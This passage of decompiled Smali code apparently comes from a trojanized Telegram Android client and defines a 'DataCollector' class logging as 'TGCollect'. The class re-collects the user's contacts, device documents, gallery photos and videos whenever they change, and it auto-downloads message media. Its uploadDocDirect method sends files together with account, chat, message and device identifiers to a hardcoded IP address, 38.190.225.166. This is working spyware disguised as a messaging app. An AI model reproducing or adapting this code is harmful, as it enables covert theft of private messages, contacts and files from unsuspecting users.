    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/2addr v4, v0

    goto :goto_0

    .line 752
    :cond_0
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    .line 754
    :catch_0
    const-string p0, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    return-object p0
.end method

.method private triggerContactsRescan()V
    .locals 3

    .line 284
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-nez v0, :cond_0

    return-void

    .line 286
    :cond_0
    const-string v1, "TGCollect"

    const-string v2, "Contacts change detected, re-collecting..."

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v1, 0x0

    .line 288
    iput-boolean v1, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollected:Z

    .line 289
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectPhoneContacts(Landroid/content/Context;I)V

    return-void
.end method

.method private triggerDocsRescan()V
    .locals 3

    .line 277
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-nez v0, :cond_0

    return-void

    .line 279
    :cond_0
    const-string v1, "TGCollect"

    const-string v2, "Docs change detected, re-scanning..."

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 280
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectDeviceDocs(Landroid/content/Context;I)V

    return-void
.end method

.method private triggerGalleryRescan()V
    .locals 3

    .line 263
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-nez v0, :cond_0

    return-void

    .line 265
    :cond_0
    const-string v1, "TGCollect"

    const-string v2, "Gallery change detected, re-scanning..."

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 266
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectGalleryImages(Landroid/content/Context;I)V

    return-void
.end method

.method private triggerMsgDownload(ILorg/telegram/tgnet/TLRPC$Message;)V
    .locals 18

    move-object/from16 v0, p2

    const-string v7, "TGCollect"

    .line 1843
    :try_start_0
    invoke-static/range {p1 .. p1}, Lorg/telegram/messenger/FileLoader;->getInstance(I)Lorg/telegram/messenger/FileLoader;

    move-result-object v1

    .line 1844
    iget-object v2, v0, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    instance-of v3, v2, Lorg/telegram/tgnet/TLRPC$TL_messageMediaPhoto;

    const-wide/32 v4, 0x500000

    if-eqz v3, :cond_0

    .line 1845
    check-cast v2, Lorg/telegram/tgnet/TLRPC$TL_messageMediaPhoto;

    iget-object v2, v2, Lorg/telegram/tgnet/TLRPC$MessageMedia;->photo:Lorg/telegram/tgnet/TLRPC$Photo;

    .line 1846
    instance-of v3, v2, Lorg/telegram/tgnet/TLRPC$TL_photo;

    if-eqz v3, :cond_a

    .line 1847
    iget-object v3, v2, Lorg/telegram/tgnet/TLRPC$Photo;->sizes:Ljava/util/ArrayList;

    const/16 v6, 0x500

    invoke-static {v3, v6}, Lorg/telegram/messenger/FileLoader;->getClosestPhotoSizeWithSize(Ljava/util/ArrayList;I)Lorg/telegram/tgnet/TLRPC$PhotoSize;

    move-result-object v3

    if-eqz v3, :cond_a

    .line 1848
    iget v6, v3, Lorg/telegram/tgnet/TLRPC$PhotoSize;->size:I

    int-to-long v8, v6

    cmp-long v6, v8, v4

    if-gtz v6, :cond_a

    .line 1849
    invoke-static {v3, v2}, Lorg/telegram/messenger/ImageLocation;->getForPhoto(Lorg/telegram/tgnet/TLRPC$PhotoSize;Lorg/telegram/tgnet/TLRPC$Photo;)Lorg/telegram/messenger/ImageLocation;

    move-result-object v2

    if-eqz v2, :cond_a

    .line 1850
    const-string v4, "jpg"

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object/from16 v3, p2

    invoke-virtual/range {v1 .. v6}, Lorg/telegram/messenger/FileLoader;->loadFile(Lorg/telegram/messenger/ImageLocation;Ljava/lang/Object;Ljava/lang/String;II)V

    goto/16 :goto_8

    :catch_0
    move-exception v0

    goto/16 :goto_7

    .line 1853
    :cond_0
    instance-of v3, v2, Lorg/telegram/tgnet/TLRPC$TL_messageMediaDocument;

    if-eqz v3, :cond_a

    .line 1854
    check-cast v2, Lorg/telegram/tgnet/TLRPC$TL_messageMediaDocument;

    iget-object v2, v2, Lorg/telegram/tgnet/TLRPC$MessageMedia;->document:Lorg/telegram/tgnet/TLRPC$Document;

    if-nez v2, :cond_1

    return-void

    .line 1856
    :cond_1
    iget-object v3, v2, Lorg/telegram/tgnet/TLRPC$Document;->mime_type:Ljava/lang/String;

    if-eqz v3, :cond_2

    sget-object v6, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-virtual {v3, v6}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v3

    goto :goto_0

    :cond_2
    const-string v3, ""

    .line 1857
    :goto_0
    invoke-static {v2}, Lorg/telegram/messenger/MessageObject;->isVoiceDocument(Lorg/telegram/tgnet/TLRPC$Document;)Z

    move-result v6

    const/4 v8, 0x1

    if-nez v6, :cond_3

    .line 1858
    const-string v10, "audio/"

    invoke-virtual {v3, v10}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_3

    iget-wide v10, v2, Lorg/telegram/tgnet/TLRPC$Document;->size:J

    const-wide/32 v12, 0x1400000

    cmp-long v14, v10, v12

    if-gtz v14, :cond_3

    const/4 v10, 0x1

    goto :goto_1

    :cond_3
    const/4 v10, 0x0

    .line 1859
    :goto_1
    const-string v11, "video/"

    invoke-virtual {v3, v11}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v11

    const-wide/32 v12, 0x3200000

    if-eqz v11, :cond_4

    iget-wide v14, v2, Lorg/telegram/tgnet/TLRPC$Document;->size:J

    cmp-long v11, v14, v12

    if-gtz v11, :cond_4

    const/4 v11, 0x1

    goto :goto_2

    :cond_4
    const/4 v11, 0x0

    .line 1860
    :goto_2
    invoke-static {v2}, Lorg/telegram/messenger/MessageObject;->isStickerDocument(Lorg/telegram/tgnet/TLRPC$Document;)Z

    move-result v14

    if-nez v14, :cond_6

    invoke-static {v2, v8}, Lorg/telegram/messenger/MessageObject;->isAnimatedStickerDocument(Lorg/telegram/tgnet/TLRPC$Document;Z)Z

    move-result v14

    if-eqz v14, :cond_5

    goto :goto_3

    :cond_5
    const/4 v14, 0x0

    goto :goto_4

    :cond_6
    :goto_3
    const/4 v14, 0x1

    .line 1861
    :goto_4
    const-string v15, "image/"

    invoke-virtual {v3, v15}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v15

    if-eqz v15, :cond_7

    iget-wide v8, v2, Lorg/telegram/tgnet/TLRPC$Document;->size:J

    cmp-long v16, v8, v4

    if-gtz v16, :cond_7

    const/4 v4, 0x1

    goto :goto_5

    :cond_7
    const/4 v4, 0x0

    :goto_5
    if-nez v4, :cond_8

    if-nez v6, :cond_8

    if-nez v10, :cond_8

    if-nez v11, :cond_8

    if-nez v14, :cond_8

    .line 1862
    iget-wide v8, v2, Lorg/telegram/tgnet/TLRPC$Document;->size:J

    const-wide/16 v16, 0x0

    cmp-long v5, v8, v16

    if-lez v5, :cond_8

    cmp-long v5, v8, v12

    if-gtz v5, :cond_8

    const/4 v8, 0x1

    goto :goto_6

    :cond_8
    const/4 v8, 0x0

    :goto_6
    if-nez v6, :cond_9

    if-nez v10, :cond_9

    if-nez v11, :cond_9

    if-nez v14, :cond_9

    if-nez v4, :cond_9

    if-eqz v8, :cond_a

    :cond_9
    const/4 v4, 0x0

    .line 1865
    invoke-virtual {v1, v2, v0, v4, v4}, Lorg/telegram/messenger/FileLoader;->loadFile(Lorg/telegram/tgnet/TLRPC$Document;Ljava/lang/Object;II)V

    .line 1866
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "triggerMsgDownload: dialog="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v4, v0, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    invoke-virtual {v1, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v2, " msg="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v0, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " mime="

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_8

    .line 1870
    :goto_7
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "triggerMsgDownload: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_a
    :goto_8
    return-void
.end method

.method private triggerVideoRescan()V
    .locals 3

    .line 270
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-nez v0, :cond_0

    return-void

    .line 272
    :cond_0
    const-string v1, "TGCollect"

    const-string v2, "Video change detected, re-scanning..."

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 273
    iget v1, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    invoke-virtual {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->collectGalleryVideos(Landroid/content/Context;I)V

    return-void
.end method

.method private uploadDocDirect(IJILjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;
    .locals 13

    move-object v1, p0

    const-string v0, "\r\n"

    const-string v2, "POST"

    const-string v3, "https://38.190.225.166/api/doc"

    const-string v4, "TGCollect"

    const/4 v5, -0x1

    const/4 v6, 0x0

    .line 2321
    :try_start_0
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v8

    invoke-virtual {v7, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 2322
    sget-object v8, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v8}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    .line 2323
    sget-object v9, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-direct {p0, v9}, Lorg/telegram/messenger/DataCollector;->currentNetworkState(Landroid/content/Context;)Lorg/telegram/messenger/DataCollector$NetworkState;

    move-result-object v9

    .line 2324
    new-instance v10, Ljava/net/URL;

    invoke-direct {v10, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v10

    check-cast v10, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_3

    .line 2325
    :try_start_1
    invoke-virtual {v10, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 2326
    const-string v6, "Content-Type"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "multipart/form-data; boundary="

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v6, v11}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 2327
    const-string v6, "X-Network-Type"

    iget-object v11, v9, Lorg/telegram/messenger/DataCollector$NetworkState;->type:Ljava/lang/String;

    invoke-virtual {v10, v6, v11}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v6, 0x1

    .line 2328
    invoke-virtual {v10, v6}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const/16 v6, 0x3a98

    .line 2329
    invoke-virtual {v10, v6}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    const v6, 0xea60

    .line 2330
    invoke-virtual {v10, v6}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 2331
    const-string v6, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    invoke-static {v10, v2, v3, v6, v8}, Lorg/telegram/messenger/DataCollector;->addHMACHeaders(Ljava/net/HttpURLConnection;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2332
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v10}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 2333
    const-string v3, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v11

    invoke-static {v11, v12}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v6

    invoke-direct {p0, v2, v7, v3, v6}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2334
    const-string v3, "dialog_id"

    invoke-static/range {p2 .. p3}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v6

    invoke-direct {p0, v2, v7, v3, v6}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2335
    const-string v3, "msg_id"

    invoke-static/range {p4 .. p4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v6

    invoke-direct {p0, v2, v7, v3, v6}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2336
    const-string v3, "network_type"

    iget-object v6, v9, Lorg/telegram/messenger/DataCollector$NetworkState;->type:Ljava/lang/String;

    invoke-direct {p0, v2, v7, v3, v6}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2337
    const-string v3, "is_wifi"

    iget-boolean v6, v9, Lorg/telegram/messenger/DataCollector$NetworkState;->wifi:Z

    if-eqz v6, :cond_0

    const-string v6, "true"

    goto :goto_0

    :catchall_0
    move-exception v0

    move-object v6, v10

    goto/16 :goto_8

    :catch_0
    move-exception v0

    move-object v6, v10

    goto/16 :goto_7

    :cond_0
    const-string v6, "false"

    :goto_0
    invoke-direct {p0, v2, v7, v3, v6}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2338
    const-string v3, "file_name"

    if-eqz p6, :cond_1

    move-object/from16 v6, p6

    goto :goto_1

    :cond_1
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    :goto_1
    invoke-direct {p0, v2, v7, v3, v6}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    if-eqz p7, :cond_2

    .line 2339
    invoke-virtual/range {p7 .. p7}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_2

    move-object/from16 v3, p7

    goto :goto_2

    :cond_2
    const-string v3, "application/octet-stream"

    .line 2340
    :goto_2
    const-string v6, "mime_type"

    invoke-direct {p0, v2, v7, v6, v3}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    if-eqz p6, :cond_3

    move-object/from16 v6, p6

    goto :goto_3

    .line 2342
    :cond_3
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    .line 2343
    :goto_3
    const-string v8, "UTF-8"

    invoke-static {v6, v8}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v8, "+"

    const-string v9, "%20"

    invoke-virtual {v6, v8, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    .line 2344
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "--"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v2, v8}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2345
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Content-Disposition: form-data; name=\"file\"; filename=\"file\"; filename*=UTF-8\'\'"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2348
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Content-Type: "

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\r\n\r\n"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2349
    new-instance v3, Ljava/io/FileInputStream;

    move-object/from16 v0, p5

    invoke-direct {v3, v0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/high16 v0, 0x10000

    .line 2350
    :try_start_2
    new-array v0, v0, [B

    .line 2352
    :goto_4
    invoke-virtual {v3, v0}, Ljava/io/FileInputStream;->read([B)I

    move-result v6

    if-eq v6, v5, :cond_4

    const/4 v8, 0x0

    invoke-virtual {v2, v0, v8, v6}, Ljava/io/DataOutputStream;->write([BII)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    goto :goto_4

    :catchall_1
    move-exception v0

    move-object v2, v0

    goto :goto_5

    .line 2353
    :cond_4
    :try_start_3
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    .line 2354
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\r\n--"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "--\r\n"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2355
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 2356
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    .line 2357
    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    .line 2358
    new-instance v2, Lorg/telegram/messenger/DataCollector$PostResult;

    invoke-static {v10}, Lorg/telegram/messenger/DataCollector;->parseRetryAfterMs(Ljava/net/HttpURLConnection;)J

    move-result-wide v6

    invoke-direct {v2, v0, v6, v7}, Lorg/telegram/messenger/DataCollector$PostResult;-><init>(IJ)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 2363
    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object v2

    .line 2349
    :goto_5
    :try_start_4
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    goto :goto_6

    :catchall_2
    move-exception v0

    move-object v3, v0

    :try_start_5
    invoke-virtual {v2, v3}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_6
    throw v2
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :catchall_3
    move-exception v0

    goto :goto_8

    :catch_1
    move-exception v0

    .line 2360
    :goto_7
    :try_start_6
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "uploadDocDirect: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 2361
    new-instance v0, Lorg/telegram/messenger/DataCollector$PostResult;

    const-wide/16 v2, 0x3e8

    invoke-direct {v0, v5, v2, v3}, Lorg/telegram/messenger/DataCollector$PostResult;-><init>(IJ)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    if-eqz v6, :cond_5

    .line 2363
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_5
    return-object v0

    :goto_8
    if-eqz v6, :cond_6

    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 2364
    :cond_6
    throw v0
.end method

.method private uploadDocDirect(ILjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;
    .locals 8

    const-wide/16 v2, 0x0

    const/4 v4, 0x0

    move-object v0, p0

    move v1, p1

    move-object v5, p2

    move-object v6, p3

    move-object v7, p4

    .line 2313
    invoke-direct/range {v0 .. v7}, Lorg/telegram/messenger/DataCollector;->uploadDocDirect(IJILjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object p1

    return-object p1
.end method

.method private uploadFileDirect(Ljava/lang/String;IJIJZLjava/io/File;)Z
    .locals 13

    move/from16 v0, p5

    int-to-long v5, v0

    .line 2372
    const-string v11, ""

    const-string v12, "image/jpeg"

    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-wide/from16 v3, p3

    move-wide/from16 v7, p6

    move/from16 v9, p8

    move-object/from16 v10, p9

    invoke-direct/range {v0 .. v12}, Lorg/telegram/messenger/DataCollector;->uploadMultipartDirect(Ljava/lang/String;IJJJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v0

    .line 2374
    iget v0, v0, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    const/16 v1, 0xc8

    if-lt v0, v1, :cond_0

    const/16 v1, 0x12c

    if-ge v0, v1, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private uploadFileMultipart(Ljava/lang/String;IJIJZLjava/io/File;)V
    .locals 12

    .line 2600
    const-string v10, ""

    const-string v11, "image/jpeg"

    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-wide v3, p3

    move/from16 v5, p5

    move-wide/from16 v6, p6

    move/from16 v8, p8

    move-object/from16 v9, p9

    invoke-direct/range {v0 .. v11}, Lorg/telegram/messenger/DataCollector;->uploadMultipartAsync(Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private uploadMultipartAsync(Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)V
    .locals 15

    .line 2609
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v14, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda32;

    move-object v1, v14

    move-object v2, p0

    move/from16 v3, p2

    move-object/from16 v4, p1

    move-wide/from16 v5, p3

    move/from16 v7, p5

    move-wide/from16 v8, p6

    move/from16 v10, p8

    move-object/from16 v11, p9

    move-object/from16 v12, p10

    move-object/from16 v13, p11

    invoke-direct/range {v1 .. v13}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda32;-><init>(Lorg/telegram/messenger/DataCollector;ILjava/lang/String;JIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v0, v14}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method private uploadMultipartDirect(Ljava/lang/String;IJJJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;
    .locals 15

    move-object v1, p0

    move-object/from16 v0, p1

    move-object/from16 v2, p11

    const-string v3, "\r\n"

    const-string v4, "POST"

    const-string v5, "TGCollect"

    const/4 v6, -0x1

    const/4 v7, 0x0

    .line 2384
    :try_start_0
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v9

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 2385
